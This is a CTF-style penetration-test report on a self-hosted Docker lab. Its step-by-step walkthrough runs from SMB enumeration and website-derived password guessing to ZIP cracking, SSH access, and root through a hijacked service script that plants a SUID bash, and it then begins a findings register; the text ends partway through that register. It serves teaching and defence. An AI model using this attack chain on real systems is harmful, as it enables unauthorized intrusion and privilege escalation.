# 🐧 Memesploit — Penetration Test Report & Full Exploitation Walkthrough

> **Author:** `dani-kl` — Red Team Engineer / Offensive Security
> **GitHub:** https://github.com/dani-kl
> **Report ID:** RT-2026-MEMESPLOIT-001
> **Version:** 1.0 (final)
> **Classification:** Public — Authorized Lab Environment
> **Target:** `172.17.0.2` (Docker container `0e028472c46d`)

![Author](https://img.shields.io/badge/author-dani--kl-blue?style=flat-square)
![Type](https://img.shields.io/badge/type-CTF%20%2F%20Docker%20Lab-informational?style=flat-square)
![Difficulty](https://img.shields.io/badge/difficulty-Easy%20%E2%86%92%20Medium-orange?style=flat-square)
![Status](https://img.shields.io/badge/status-Root%20Compromised-critical?style=flat-square)
![OS](https://img.shields.io/badge/OS-Linux%20(Ubuntu)-yellow?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-green?style=flat-square)

---

## 📑 Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Scope, Authorization & Rules of Engagement](#2-scope-authorization--rules-of-engagement)
3. [Target Profile & Attack Surface](#3-target-profile--attack-surface)
4. [Attack Path Overview](#4-attack-path-overview)
5. [Technical Walkthrough](#5-technical-walkthrough)
6. [Findings & Risk Register](#6-findings--risk-register)
7. [Remediation & Hardening](#7-remediation--hardening)
8. [Detection Engineering (Blue Team Notes)](#8-detection-engineering-blue-team-notes)
9. [Post-Engagement Cleanup](#9-post-engagement-cleanup)
10. [Evidence & Artifacts](#10-evidence--artifacts)
11. [Lessons Learned & Analyst Errata](#11-lessons-learned--analyst-errata)
12. [Reproduction Quickstart](#12-reproduction-quickstart)
13. [Repository Layout](#13-repository-layout)
14. [References](#14-references)
15. [Disclaimer & License](#15-disclaimer--license)

---

## 1. Executive Summary

A full-scope, black-box penetration test was performed against the **Memesploit** Linux host, a
self-contained Docker-based training lab. The assessment simulated an unauthenticated external
attacker with network-level reachability only — no credentials, no prior knowledge, no source code.

**Outcome: total compromise.** The host was fully compromised from an unauthenticated position to
`root` (UID 0) by chaining four independent weaknesses, none of which required a memory-corruption
exploit or a zero-day. Every step abused **legitimate functionality and misconfiguration**.

### Attack chain in one line

```

Anonymous SMB user enumeration → website-derived dictionary attack → authenticated SMB loot
→ weak ZIP passphrase cracked offline → plaintext SSH credentials → sudo misconfiguration
+ group-writable service directory → root-owned SUID bash → UID 0

```

### Key findings at a glance

| # | Finding | Severity | Root Cause Class |
|---|---------|----------|------------------|
| F-01 | SMB account enumeration exposed to unauthenticated sessions | 🟠 Medium | Information disclosure |
| F-02 | User password derived from public website content | 🔴 High | Weak credential policy |
| F-03 | Sensitive archive protected by a guessable passphrase | 🔴 High | Weak secret protection |
| F-04 | Plaintext SSH credentials stored inside the archive | 🔴 Critical | Credentials in files |
| F-05 | `NOPASSWD` sudo rule allowing a service restart as root | 🔴 Critical | Excessive privilege |
| F-06 | Group-writable directory containing root-executed scripts | 🔴 Critical | Insecure permissions |
| F-07 | `/tmp` usable for SUID payload execution | 🟠 Medium | Missing mount hardening |

### Business-risk translation

* **Confidentiality:** complete loss — all user data, service configuration and root-only material readable.
* **Integrity:** complete loss — attacker can rewrite any service script executed by `root`.
* **Availability:** complete loss — the same primitive permits destructive commands as `root`.
* **Persistence & lateral movement:** trivially achievable (SUID binary, service backdoor, valid SSH account).

> **Bottom line:** the perimeter was not "hacked" — it was **guessed**, and the internal permission
> model then handed the attacker `root` for free. Remediation is inexpensive and fully configuration-based.

---

## 2. Scope, Authorization & Rules of Engagement

| Item | Detail |
|------|--------|
| **Engagement type** | Black-box, network-level penetration test (lab / CTF) |
| **In scope** | `172.17.0.2` — all TCP ports, all exposed services |
| **Out of scope** | Docker host, hypervisor, other containers, external networks |
| **Authorization** | Local, intentionally vulnerable lab deployed by the tester; explicit owner consent |
| **Attacker position** | Unauthenticated, same L2 segment (Docker bridge `172.17.0.0/16`) |
| **Allowed techniques** | Enumeration, dictionary attacks, offline cracking, privilege escalation, local payload staging |
| **Excluded techniques** | DoS, host escape, destructive actions against the Docker daemon |
| **Testing OS** | Kali Linux (attacker VM) |
| **Data handling** | Lab flags only; no real PII. Credentials not legible in evidence are masked as `<PLACEHOLDER>` |

> ⚠️ **Legal notice.** All techniques documented here were executed exclusively against an isolated,
> intentionally vulnerable lab owned by the author. Reproducing them against systems you do not own
> or lack written authorization to test is illegal in most jurisdictions. See [§15](#15-disclaimer--license).

---

## 3. Target Profile & Attack Surface

### 3.1 Service inventory

| Port | Proto | Service | Role in the attack chain |
|------|-------|---------|--------------------------|
| 22 | TCP | OpenSSH | Foothold (valid credentials from loot) + trigger for the privilege-escalation payload |
| 80 | TCP | HTTP (web server) | Content harvesting for dictionary generation; no direct web vulnerability found |
| 139 / 445 | TCP | Samba (`netbios-ssn` / `microsoft-ds`) | Account enumeration, credential guessing, sensitive-file retrieval |

**Host fingerprint:** Ubuntu-based Samba build; SMB workgroup/NetBIOS name `0E028472C46D`
(matches the container hostname — a strong indicator of a containerized deployment).

### 3.2 Attack-surface reasoning

The web service was the *content* source, not the *entry point*. The genuinely exploitable surface was
**SMB**, because it simultaneously offered:

1. an **account oracle** (unauthenticated user/RID enumeration), and
2. an **authentication oracle** (fast, scriptable, no lockout, no rate limiting), and
3. a **data store** (a user share containing sensitive material).

That combination converts "a word on a webpage" into a full credential — the defining weakness of this host.

---

## 4. Attack Path Overview

### 4.1 Kill-chain diagram

```

```
                ┌──────────────────────────────┐
                │  RECON: nmap -sCV            │
                │  22 / 80 / 139 / 445         │
                └───────────────┬──────────────┘
                                │
                ┌───────────────▼──────────────┐
                │  WEB: dirb / gobuster        │
                │  → no exploitable path       │
                └───────────────┬──────────────┘
                                │
                ┌───────────────▼──────────────┐
                │  SMB: enum4linux             │
                │  user: memehydra (RID 0x3e8) │
                │  share: share_memehydra      │
                └───────────────┬──────────────┘
                                │
                ┌───────────────▼──────────────┐
                │  CeWL wordlist → netexec     │
                │  VALID SMB CREDENTIALS       │
                └───────────────┬──────────────┘
                                │
                ┌───────────────▼──────────────┐
                │  smbclient → secret.zip      │
                │  zip2john + john (wordlist2) │
                │  → memesploit_ctf            │
                └───────────────┬──────────────┘
                                │
                ┌───────────────▼──────────────┐
                │  secret.txt → SSH creds      │
                │  ssh memesploit@target       │
                │  user.txt (initial access)   │
                └───────────────┬──────────────┘
                                │
                ┌───────────────▼──────────────┐
                │  sudo -l → NOPASSWD service  │
                │  groups → security           │
                │  /etc/login_monitor (g+w)    │
                └───────────────┬──────────────┘
                                │
                ┌───────────────▼──────────────┐
                │  Ownership swap actionban.sh │
                │  inject SUID bash payload    │
                │  restart service + SSH event │
                └───────────────┬──────────────┘
                                │
                ┌───────────────▼──────────────┐
                │  /tmp/root-bash -p → UID 0   │
                │  /root/root.txt              │
                └──────────────────────────────┘
```

```

### 4.2 MITRE ATT&CK mapping

| Phase | Technique | ID | Observed implementation |
|-------|-----------|----|-------------------------|
| Discovery | Network Service Discovery | T1046 | `nmap -Pn --open -sCV` |
| Discovery | Wordlist Scanning | T1595.003 | `dirb`, `gobuster` |
| Discovery | Account Discovery | T1087 | `enum4linux` RID cycling → `memehydra` |
| Discovery | File & Directory Discovery | T1083 | `find / -group security` |
| Discovery | Permission Groups Discovery | T1069.001 | `id`, `groups`, `sudo -l` |
| Credential Access | Password Guessing | T1110.001 | `netexec smb` + CeWL dictionary |
| Credential Access | Crack Password Hashes | T1110.002 | `zip2john` + `john` (PKZIP) |
| Credential Access | Credentials In Files | T1552.001 | `secret.txt` |
| Initial Access | Valid Accounts | T1078 | SMB + SSH authentication |
| Lateral/Remote | SSH | T1021.004 | `ssh memesploit@172.17.0.2` |
| Priv. Esc. | Sudo and Sudo Caching | T1548.003 | `NOPASSWD: service login_monitor restart` |
| Defense Evasion | Linux File Permissions Modification | T1222.002 | copy → delete → rename ownership swap |
| Priv. Esc. / Persistence | Setuid/Setgid | T1548.001 | `chmod +s /tmp/root-bash` |

---

## 5. Technical Walkthrough

> **Convention:** commands are shown as executed on the attacker box (`kali`) or the victim
> (`memesploit@0e028472c46d`). Output is trimmed to the security-relevant lines.
> Values not legible in the original evidence capture appear as `<PLACEHOLDER>`.

### 5.1 Phase 0 — Lab deployment

The lab ships as a tarball with an automated deployment wrapper that loads the image and
attaches it to the Docker bridge network.

```bash
# Unpack the archive, then deploy the container
tar -xf memesploit.tar
sudo bash auto_deploy.sh memesploit.tar
```

**Why this matters for the report:** the assigned address (`172.17.0.2`) is a Docker bridge IP.
This confirms an isolated, non-routable lab and defines the authorization boundary in [§2](#2-scope-authorization--rules-of-engagement).

Verify reachability and TTL before scanning:

```bash
ping -c 2 172.17.0.2        # TTL≈64 → Linux target
```

---

### 5.2 Phase 1 — Service discovery & version detection

```bash
mkdir -p scans loot wordlists evidence

nmap -Pn --open -sCV -n 172.17.0.2 -oN scans/nmap_initial.txt
```

**Flag rationale (methodology, not muscle memory):**

| Flag | Purpose |
|------|---------|
| `-Pn` | Skip host discovery. Container/filtered environments frequently drop ICMP echo, causing false "host down" results. |
| `--open` | Report only open ports — removes `closed`/`filtered` noise from the working notes. |
| `-sC` | Run the default NSE script set (banner grabs, `smb-os-discovery`, `smb2-security-mode`, HTTP title, etc.). |
| `-sV` | Version detection — feeds targeted tooling decisions and CVE triage. |
| `-n` | Disable DNS resolution — faster, and avoids leaking queries to external resolvers. |
| `-oN` | Persist raw evidence for the report appendix. |

**Recommended follow-up for completeness** (the default scan covers only the top 1000 TCP ports):

```bash
# Full TCP sweep, then script-scan only what is discovered
nmap -Pn -p- --min-rate 2000 172.17.0.2 -oN scans/nmap_allports.txt
nmap -Pn -sCV -p 22,80,139,445 172.17.0.2 -oN scans/nmap_targeted.txt

# Optional UDP sanity check
sudo nmap -Pn -sU --top-ports 20 172.17.0.2 -oN scans/nmap_udp.txt
```

**Result:** SSH (22), HTTP (80), Samba (139/445). No obvious RCE-vulnerable version identified —
which redirects the effort from *exploit search* to *configuration and credential abuse*.

---

### 5.3 Phase 2 — Web enumeration (documented negative result)

```bash
dirb http://172.17.0.2/

gobuster dir -u http://172.17.0.2/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,bak,zip \
  -t 40 -o scans/gobuster_80.txt
```

**Outcome:** no hidden administrative panel, backup, `.git` exposure, upload endpoint or
version-disclosed CMS component was found.

> 🧠 **Professional practice:** negative results are *findings about the attack surface*, not wasted
> time. Recording them prevents duplicated effort and justifies the pivot. Here, the pivot decision
> was: **stop attacking the web app, start attacking its content and the SMB service.**

The web application nevertheless became critical later — as the **password-generation oracle** ([§5.5](#55-phase-4--targeted-wordlist-generation-cewl)).

---

### 5.4 Phase 3 — SMB enumeration & account discovery

```bash
enum4linux -a 172.17.0.2 | tee scans/enum4linux.txt

# Modern, SMB2/3-aware alternative (recommended)
enum4linux-ng -A 172.17.0.2
```

**Relevant output (normalized):**

```text
[+] Enumerating users using SID S-1-5-21-... and logon username '', password ''
S-1-5-21-...-1000  0e028472c46d\memehydra  (Local User)
user:[memehydra]  rid:[0x3e8]  acb:[0x00000010]

Share Enumeration on 172.17.0.2
  sharename          Type   Comment
  ---------          ----   -------
  print$             Disk   Printer Drivers
  share_memehydra    Disk
  IPC$               IPC    IPC Service (0e028472c46d server (Samba, Ubuntu))

Mapping: //172.17.0.2/share_memehydra  → DENIED (anonymous)
```

**Analysis — three high-value intelligence items:**

1. **Valid local account: `memehydra`.** RID `0x3e8` = decimal **1000**, the first regular Unix user
   mapped into Samba's SID space. `acb 0x00000010` = *Normal User Account*.
   This eliminates username guessing entirely — half the credential is already known.
2. **A personal share named `share_memehydra`.** The naming convention strongly suggests the share
   belongs to that account and holds that user's data — a natural place for sensitive files.
3. **Anonymous access is denied at the share layer, but permitted at the enumeration layer.**
   This is the classic "half-hardened Samba" pattern: the data is protected, the *directory of
   identities* is not.

**Expected noise — do not misread as failure:**

```text
smbXcli_negprot_smb1_done: No compatible protocol selected by server.
Protocol negotiation ... (between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available
```

The server has **SMBv1 disabled** (correct hardening). Legacy `enum4linux` falls back to SMB1 for
workgroup listing, so that specific sub-check fails. User and share enumeration already succeeded
over SMB2/3. Use `enum4linux-ng`, `netexec --shares`, or `smbclient -m SMB3` to avoid the noise:

```bash
smbclient -L //172.17.0.2 -N -m SMB3
netexec smb 172.17.0.2 -u '' -p '' --shares
netexec smb 172.17.0.2 -u 'guest' -p '' --rid-brute
```

---

### 5.5 Phase 4 — Targeted wordlist generation (CeWL)

Rather than throwing `rockyou.txt` at the service, the test used a **context-derived dictionary**:
passwords in small environments are very often words the owner already published.

```bash
cewl http://172.17.0.2 -w cewl.txt

# Strip the CeWL banner line so it is never submitted as a password candidate
tail -n +2 cewl.txt > wordlists/final_cewl.txt

wc -l wordlists/final_cewl.txt
```

**Why CeWL here:** it spiders the site and extracts the vocabulary actually used by the owner —
theme words, slogans, meme captions, product names. This produces a dictionary of tens/hundreds of
high-probability candidates instead of millions of generic ones, which means:

* far fewer authentication attempts (stealth + speed),
* no dependence on lockout thresholds,
* a much higher hit probability per attempt.

**Useful tuning options:**

```bash
cewl http://172.17.0.2 -d 3 -m 5 -w cewl_deep.txt        # deeper spider, min length 5
cewl http://172.17.0.2 --lowercase -w cewl_lower.txt     # normalize case
```

> ⚠️ **Known limitation (this became the crux of Phase 7):** CeWL tokenizes on word boundaries and,
> by default, splits on characters such as `_` and `-`. A passphrase like `memesploit_ctf` is therefore
> **decomposed into `memesploit` and `ctf`** and never tested as a single candidate. Remember this.

---

### 5.6 Phase 5 — SMB credential guessing (`netexec`)

> **Terminology correction:** this is **password guessing / a dictionary attack**
> (MITRE **T1110.001**) — *not* "password spoofing". Spoofing implies impersonating a protocol
> entity; here we simply submit candidate secrets to a legitimate authentication endpoint.

```bash
netexec smb 172.17.0.2 \
  -u memehydra \
  -p wordlists/final_cewl.txt \
  --ignore-pw-decoding
```

**Flag rationale:**

| Flag | Purpose |
|------|---------|
| `-u memehydra` | Single known-valid account (from RID enumeration) → no username spraying needed. |
| `-p <file>` | NetExec treats an existing file path as a candidate list. |
| `--ignore-pw-decoding` | Suppresses UTF-8 decode exceptions on malformed/non-UTF8 wordlist lines so the run does not abort mid-list. |

**Optional operational refinements:**

```bash
netexec smb 172.17.0.2 -u memehydra -p wordlists/final_cewl.txt \
  --ignore-pw-decoding --continue-on-success -t 5
```

* `--continue-on-success` — do not stop at the first hit; useful for detecting multiple valid secrets or reused passwords.
* `-t 5` — throttle threads to reduce log volume and avoid tripping lockout/rate limits in real engagements.

**Output pattern:**

```text
SMB  172.17.0.2  445  0E028472C46D  [-] 0E028472C46D\memehydra:sight      STATUS_LOGON_FAILURE
SMB  172.17.0.2  445  0E028472C46D  [-] 0E028472C46D\memehydra:plain      STATUS_LOGON_FAILURE
SMB  172.17.0.2  445  0E028472C46D  [-] 0E028472C46D\memehydra:kingdom    STATUS_LOGON_FAILURE
SMB  172.17.0.2  445  0E028472C46D  [-] 0E028472C46D\memehydra:remember   STATUS_LOGON_FAILURE
...
SMB  172.17.0.2  445  0E028472C46D  [+] 0E028472C46D\memehydra:<SMB_PASS>
```

**Interpretation:** `[-] … STATUS_LOGON_FAILURE` = rejected candidate; `[+]` = **valid credential**.
A `(Pwn3d!)` suffix would additionally indicate local-admin rights on the target — not present here,
so this is a standard user credential.

**Result:** `memehydra : <SMB_PASS>` — a password taken verbatim from the public website.

> 🔎 **Root cause:** the site is effectively a **password disclosure document**. Any word published on
> an internet-facing page must be treated as public knowledge and excluded from credential material.

---

### 5.7 Phase 6 — Authenticated share access & sensitive-file retrieval

```bash
smbclient //172.17.0.2/share_memehydra -U memehydra
# password: <SMB_PASS>
```

```text
smb: \> dir
  .                                   D        0  Sat Aug 31 10:15:13 2024
  ..                                  D        0  Sat Aug 31 10:15:13 2024
  secret.zip                                   224  Sat Aug 31 10:15:06 2024

smb: \> get secret.zip
smb: \> exit
```

**Non-interactive alternative (better for scripting/evidence):**

```bash
smbclient //172.17.0.2/share_memehydra -U 'memehydra%<SMB_PASS>' \
  -c 'prompt OFF; recurse ON; mget *'
```

**Analysis:** a 224-byte archive named `secret.zip` in a personal share is a textbook
**credentials-at-rest** indicator. Note the *defence-in-depth illusion*: the operator protected the
archive with a passphrase, but stored it on a share whose own password was public — the outer layer
adds no meaningful security if the inner secret is equally weak.

```bash
file secret.zip
unzip -l secret.zip     # confirm contents: secret.txt
sha256sum secret.zip | tee evidence/secret.zip.sha256
```

---

### 5.8 Phase 7 — Offline cracking of the ZIP (and why wordlist v1 failed)

#### 5.8.1 Extract the hash

```bash
zip2john secret.zip > loot/zip.hash
cat loot/zip.hash
```

`zip2john` converts the PKZIP archive into a John-readable hash line. **Cracking is then fully
offline** — no further packets to the target, no lockout, no logs, unlimited attempts.

#### 5.8.2 First attempt — fails

```bash
john --wordlist=wordlists/final_cewl.txt loot/zip.hash
# → no candidate cracked
```

**Diagnosis (the key analytical moment of this engagement):**
the CeWL list is *semantically* correct but *structurally* wrong. CeWL split compound tokens on
non-alphanumeric separators, so a passphrase containing `_` was never present as a single line.
The fix is not "more words" — it is **a different tokenizer**.

#### 5.8.3 Wordlist v2 — separator-preserving token extraction

```bash
wget -qO- http://172.17.0.2 \
  | html2text \
  | grep -oE '\b[a-zA-Z0-9/_-]{3,}\b' \
  | sort -u > wordlists/full_words.txt

wc -l wordlists/full_words.txt
```

**Pipeline breakdown:**

| Stage | Function |
|-------|----------|
| `wget -qO-` | Fetch the page quietly to stdout (no file on disk). |
| `html2text` | Strip markup → clean text, so HTML attributes/tags do not pollute the dictionary. |
| `grep -oE '\b[a-zA-Z0-9/_-]{3,}\b'` | Emit **only** matching tokens, **keeping `_`, `/`, `-` inside words**, minimum length 3. |
| `sort -u` | Deduplicate → smaller keyspace, faster crack. |

> 💡 **Transferable lesson:** when a targeted dictionary fails, question your **tokenization and
> mutation strategy** before escalating to brute force. Character-class-aware extraction
> (`grep -oE`) recovers compound passphrases that word-boundary scrapers destroy.

Optional coverage expansion:

```bash
# Recursive harvest for multi-page sites
wget -q -r -l 2 -O- http://172.17.0.2 | html2text \
  | grep -oE '\b[a-zA-Z0-9/_-]{3,}\b' | sort -u > wordlists/full_words_recursive.txt

# Add rule-based mutations (case, digits, separators)
john --wordlist=wordlists/full_words.txt --rules=wordlist loot/zip.hash
```

#### 5.8.4 Second attempt — success

```bash
john --wordlist=wordlists/full_words.txt loot/zip.hash
```

```text
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

memesploit_ctf   (secret.zip/secret.txt)

1g 0:00:00:00 DONE  100.00% (2024-08-31)
Session completed.
```

**Recovered passphrase:** `memesploit_ctf`
*(the underscore is precisely why the CeWL list missed it — validate against your own run output).*

```bash
john --show loot/zip.hash        # re-display cracked secrets from the pot file
```

---

### 5.9 Phase 8 — Plaintext credential disclosure → SSH foothold

```bash
unzip secret.zip
# Archive: secret.zip
# [secret.zip] secret.txt password: memesploit_ctf
#   inflating: secret.txt

cat secret.txt
```

```text
memesploit:<SSH_PASS>
```

**Analysis:** the archive contained **cleartext credentials for a second, different account**
(`memesploit`, a local shell user). Two compounding failures:

1. **Credentials in files (T1552.001)** — secrets written to disk in plaintext, then merely wrapped in a weak archive.
2. **Secret sprawl across services** — a web-derived password protects an SMB account, which stores a
   ZIP, which stores an SSH password. One weak link collapses the entire chain.

```bash
ssh memesploit@172.17.0.2
# password: <SSH_PASS>
```

```text
Last login: Sat Aug 31 16:41:01 2024
memesploit@0e028472c46d:~$ ls
user.txt
```

**Initial access achieved (user-level flag located).**

```bash
cat user.txt
```

> 📝 **Evidence note:** `user.txt` was observed in **encoded/hashed form** rather than plaintext.
> In a real report, document the transformation and the decoding step explicitly
> (`base64 -d`, `xxd -r -p`, hash identification via `hashid`/`hash-identifier`).
> Do not claim a flag value you have not verifiably decoded.

**Stabilize the session (recommended):**

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm; stty rows 40 cols 120
id; hostname; uname -a; cat /etc/os-release
```

---

### 5.10 Phase 9 — Local privilege enumeration

Standard Linux privilege-escalation triage, executed in priority order:

```bash
id                        # UID/GID + supplementary groups
groups                    # confirm interesting group memberships
sudo -l                   # ← highest-signal check on any Linux box
```

**`sudo -l` output:**

```text
Matching Defaults entries for memesploit on 0e028472c46d:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User memesploit may run the following commands on 0e028472c46d:
    (ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart
```

```bash
groups
# memesploit ... security      ← non-default group: investigate immediately
```

**Two decisive leads:**

| Lead | Why it matters |
|------|----------------|
| `(ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart` | The user may execute a **root-privileged init script** with no password. `service` runs `/etc/init.d/login_monitor` as UID 0. Anything that script executes runs as root. |
| Membership in group `security` | Custom groups exist for a reason. Enumerate every filesystem object that group can write. |

**Additional enumeration performed / recommended:**

```bash
find / -group security -not -path '/proc/*' 2>/dev/null
find / -perm -4000 -type f 2>/dev/null            # pre-existing SUID binaries
getcap -r / 2>/dev/null                            # dangerous capabilities
cat /etc/crontab; ls -la /etc/cron.*               # scheduled root jobs
ss -ltnp                                           # internal-only listeners
ls -la /home /root 2>/dev/null
mount | grep -E ' /tmp | /dev/shm '                # nosuid/noexec hardening present?
```

---

### 5.11 Phase 10 — Root-cause analysis of the escalation primitive

```bash
find / -group security 2>/dev/null | grep -v /proc/
# /etc/login_monitor

ls -al /etc/login_monitor
```

```text
total 36
drwxrwx---  2 root security 4096 Aug 31  2024 .
drwxr-xr-x  1 root root     4096 Nov 17 23:06 ..
-rwxr-xr-x  1 root root      620 Aug 31  2024 actionban.sh
-rwxr-xr-x  1 root root      472 Aug 31  2024 activity.sh
-rw-r-----  1 root root      200 Aug 31  2024 loggin.conf
-rw-r-----  1 root root      224 Aug 31  2024 network.conf
-rwxr-xr-x  1 root root      501 Aug 31  2024 network.sh
-rw-r--r--  1 root root      209 Aug 31  2024 security.conf
-rwxr-xr-x  1 root root      488 Aug 31  2024 security.sh
```

```bash
find / -name "login_monitor" 2>/dev/null | grep -v /proc/
# /etc/init.d/login_monitor
# /etc/login_monitor

cat /etc/init.d/login_monitor
```

#### 🎯 The vulnerability, stated precisely

```
drwxrwx---  root security   /etc/login_monitor
    │││ │││
    │││ └┴┴── group: r w x   ← group 'security' can WRITE and TRAVERSE
    ││└────── owner: r w x
    └──────── directory
```

* Every `.sh` file is `root:root 0755` → the user **cannot edit any script in place**.
* **But the containing directory is group-writable (`rwx` for `security`), and `memesploit` is in `security`.**
* On POSIX filesystems, **creating, deleting and renaming a file is governed by the permissions of
  the *parent directory*, not the file itself.** File ownership is irrelevant to `unlink()`.
* There is **no sticky bit** (`t`) on the directory — so a group member may delete files owned by *other* users, including `root`.

> 🔥 **Therefore:** the attacker cannot *modify* `actionban.sh`, but can **replace** it with an
> attacker-owned file of the same name. The root-executed service will then run attacker code.
> This is a **write-permission-on-directory → arbitrary root code execution** primitive.

**Why the sudo rule is the other half of the bug:**
`service login_monitor restart` is not a "safe, bounded operation". `/usr/sbin/service` invokes the
SysV init script as root, and that script executes helpers from the attacker-controlled directory.
The sudoers author allowed a *verb* (`restart`) without controlling the *code* that verb runs —
a canonical sudo misconfiguration pattern (cf. GTFOBins-style reasoning applied to custom services).

#### Identifying the best target script

```bash
cd /etc/login_monitor
ls -al /tmp
grep -r "block_log.txt" .
# actionban.sh:BLOCK_LOG="/tmp/block_log.txt"
```

**Reasoning:** a script that writes to `/tmp` is (a) definitely executed at runtime, and
(b) confirms an event-driven *action* handler rather than a passive config file.
`actionban.sh` is the ban/blocking action of the login monitor — invoked when the daemon reacts to
an authentication event. That makes it both **reachable** and **triggerable on demand**.

```bash
cat actionban.sh          # ALWAYS read before modifying: understand args, shebang, flow
```

---

### 5.12 Phase 11 — Weaponization via file-ownership swap

Because in-place editing is impossible, ownership is transferred by **copy → delete → rename**:

```bash
cd /etc/login_monitor

# 0) Preserve a pristine backup OUTSIDE the target directory (for cleanup/rollback)
cp -a actionban.sh /tmp/actionban.sh.orig

# 1) Copy — the new file is owned by the invoking user (memesploit)
cp actionban.sh actionban.sh.1

# 2) Delete the root-owned original (permitted: parent dir is group-writable, no sticky bit)
rm actionban.sh
# rm: remove write-protected regular file 'actionban.sh'? y

# 3) Rename the attacker-owned copy back to the expected filename
mv actionban.sh.1 actionban.sh

# 4) Verify ownership AND the execute bit
ls -al actionban.sh
chmod 755 actionban.sh
```

**Expected result:**

```text
-rwxr-xr-x 1 memesploit security 620 Aug 31  2024 actionban.sh
             ^^^^^^^^^^ attacker now owns a file that root will execute
```

**Why each step is necessary:**

| Step | Mechanism |
|------|-----------|
| `cp` | Creates a **new inode owned by `memesploit`**. Permission bits are inherited from the source (subject to umask) — hence the explicit `chmod 755` verification. |
| `rm` | `unlink()` checks **directory** write+execute permission, not file ownership. The "write-protected" prompt refers to the *file* mode and is safely overridable (`y`, or `rm -f`). |
| `mv` | Rename within the same filesystem is a directory operation — again allowed by the group-writable parent. |
| Net effect | Same path, same name, same apparent purpose — **different owner, attacker-controlled content.** |

> 🧠 **Detection insight:** the file's `mtime` may be preserved by `cp`, but **`ctime` and the owner
> change**. Ownership transitions on root-executed service scripts are a high-fidelity detection signal.

---

### 5.13 Phase 12 — Payload injection and triggering

Append a minimal, reversible SUID-shell payload to the (now attacker-owned) script:

```bash
nano actionban.sh
# --- append at the end of the file ---
# cp /bin/bash /tmp/root-bash
# chmod +s /tmp/root-bash
```

```bash
tail -n 8 actionban.sh
```

```text
echo "$MESSAGE"
# Registrar el intento de bloqueo en el archivo
echo "$(date): $MESSAGE" >> "$BLOCK_LOG"
echo "El registro ha sido creado en $BLOCK_LOG con la IP $IP_TO_BLOCK"

cp /bin/bash /tmp/root-bash
chmod +s /tmp/root-bash
```

**Payload engineering notes:**

* Appending **at the end** preserves original functionality → the service keeps working, reducing the
  chance of an operator noticing a broken monitor.
* `cp /bin/bash` executes **as root** (the service context), so the copy is `root:root`.
* `chmod +s` sets **both** SUID and SGID. A tighter, less noisy alternative is `chmod 4755` (SUID only).
* The result is a **persistent root primitive** that survives reboots and does not require sudo again.

**Trigger the root execution using the granted sudo right:**

```bash
sudo -u root /usr/sbin/service login_monitor restart
```

```text
Stopping login_monitor...
Starting login_monitor...
```

> `sudo -u root` is redundant (root is the default sudo target) but matches the `(ALL : ALL)` rule
> explicitly and is harmless.

**Important behavioural detail — why the payload did not fire immediately:**

```bash
ls -al /tmp        # /tmp/root-bash NOT yet present
```

Restarting the service only (re)starts the **monitoring daemon**. `actionban.sh` is an **event handler**:
it runs when the monitor decides to act on a login event — not on daemon start. The payload therefore
needs an **authentication event** to be generated.

```bash
exit
ssh memesploit@172.17.0.2
# password: <SSH_PASS>

ls -al /tmp
```

```text
-rwsr-sr-x 1 root root 1183448 Nov 18 00:00 /tmp/root-bash
 ^^^ SUID/SGID set, owner root → the injected code executed as UID 0
```

> 💡 **Tradecraft:** if a single successful login does not trigger the ban handler, generate
> **failed** authentication attempts (the handler's actual purpose is blocking abusive IPs):
> `for i in $(seq 1 5); do ssh invalid@172.17.0.2 exit; done`
> Always read the daemon/init logic to learn the *exact* trigger condition instead of guessing.

---

### 5.14 Phase 13 — Root shell and objective completion

```bash
/tmp/root-bash -p
```

**Why `-p` is mandatory:** Bash drops effective privileges when `EUID != RUID` unless started in
*privileged mode*. Without `-p`, the SUID bit is neutralized and you land back in your own UID.
`-p` preserves the effective UID (0).

```bash
whoami
id
hostname
cd /root
ls -al
cat root.txt
```

```text
root
uid=1000(memesploit) gid=1000(memesploit) euid=0(root) egid=0(root) groups=...
0e028472c46d
<ROOT_FLAG>
```

**✅ Objective complete — full system compromise (UID 0).**

Cleaner root shell (optional):

```bash
/tmp/root-bash -p -c 'exec /bin/bash -i'
# or plant an SSH key for durable, log-friendly access (lab only):
# mkdir -p /root/.ssh && echo '<attacker_pubkey>' >> /root/.ssh/authorized_keys
```

---

## 6. Findings & Risk Register

Severities are contextual to this host; CVSS v3.1 vectors are **analyst estimates** for prioritization.

### F-01 — Unauthenticated SMB account enumeration 🟠 Medium

* **Evidence:** `enum4linux` RID cycling returned `memehydra` (`rid 0x3e8`) with a null session.
* **Impact:** removes username uncertainty; enables precise, low-volume credential attacks.
* **CVSS:** `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` ≈ **5.3**
* **Fix:** disable null/guest sessions, restrict RID enumeration (`restrict anonymous = 2`), block 139/445 from untrusted networks.

### F-02 — Password derived from public website content 🔴 High

* **Evidence:** CeWL dictionary + `netexec smb` yielded a valid password for `memehydra`.
* **Impact:** authenticated access to the user share; first domino of the full chain.
* **CVSS:** `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N` ≈ **8.2**
* **Fix:** enforce a deny-list of site vocabulary in the password policy, minimum length ≥ 14, MFA, account lockout / rate limiting, deploy a password manager.

### F-03 — Sensitive archive protected by a guessable passphrase 🔴 High

* **Evidence:** `zip2john` + `john` cracked `secret.zip` (`memesploit_ctf`) from a site-derived wordlist.
* **Impact:** protection-at-rest is nominal only; the archive is effectively plaintext.
* **CVSS:** `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` ≈ **6.5** (rises when chained with F-02)
* **Fix:** never rely on ZIP passphrases for secret storage; use a secrets manager / age / GPG with high-entropy keys; keep secrets off file shares.

### F-04 — Plaintext SSH credentials in `secret.txt` 🔴 Critical

* **Evidence:** `cat secret.txt` → `memesploit:<SSH_PASS>`; credentials accepted over SSH.
